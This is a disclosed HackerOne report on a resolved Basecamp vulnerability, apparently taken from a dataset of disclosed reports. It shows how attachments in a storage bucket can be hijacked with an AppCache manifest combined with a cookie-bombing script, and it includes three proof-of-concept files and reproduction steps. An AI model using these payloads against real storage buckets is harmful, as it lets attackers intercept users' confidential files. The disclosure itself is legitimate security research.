---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '403602'
original_report_id: '403602'
title: Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs
  bucket)
weakness: Business Logic Errors
team_handle: basecamp
created_at: '2018-08-31T18:58:43.094Z'
disclosed_at: '2020-11-26T18:20:26.237Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 52
asset_identifier: 3.basecamp.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- business-logic-errors
---

# Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)

## Metadata

- HackerOne Report ID: 403602
- Weakness: Business Logic Errors
- Program: basecamp
- Disclosed At: 2020-11-26T18:20:26.237Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Basecamp attachments are stored in the `bc3_production_blobs` bucket in the root directory and can be served with `text/html` content-type. 

https://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com&Expires=1535826443&Signature=*sign*&response-content-type=text/html

So with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker. 
To know more about this trick refer to https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/

##Reproduction steps
To upload the files:
1. Login to 3.basecamp.com
2. Open campfire of any project
3. Upload target files 
4. Extract direct links of them to Google Storage and remove `response-content-disposition` param

I have uploaded 3 files by this way:
```
<html manifest="[manifest_url]">
This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.
<script>
setTimeout(function(){
for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
}, 3000);
</script>
</html>
```
```
CACHE MANIFEST 

FALLBACK:
/bc3_production_blobs/ [fallback_url]
```
```
<html>
<script>
alert('Your request to the page '+location.href+' is hijacked!');
</script>
</html>
```

##PoC
Go to http://████████/bc3attach and then try to open any direct link of `bc3_production_blobs` bucket. You will see alert popup with full url of this file.
Refer to the video.

## Impact

Direct links to any attachments can be hijacked and confedential files can be compromised

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
